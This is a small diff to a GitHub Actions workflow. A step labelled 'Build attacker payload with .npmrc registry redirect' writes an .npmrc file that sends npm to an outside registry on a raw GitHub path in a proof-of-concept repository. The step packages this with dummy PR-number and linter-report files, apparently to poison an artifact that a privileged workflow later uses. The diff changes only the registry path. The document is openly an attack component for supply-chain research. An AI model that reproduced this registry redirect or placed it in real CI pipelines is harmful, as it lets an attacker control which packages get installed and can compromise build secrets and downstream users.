@@ -11,7 +11,7 @@ jobs:
       - name: Build attacker payload with .npmrc registry redirect
         run: |
           mkdir -p /tmp/root
-          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg/\naudit=false\nfund=false\nprogress=false\n' > /tmp/root/.npmrc
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg2/\naudit=false\nfund=false\nprogress=false\n' > /tmp/root/.npmrc
           printf '42\n' > /tmp/root/pr-number.txt
           printf 'hello\n' > /tmp/root/linter-report.txt
           ls -la /tmp/root
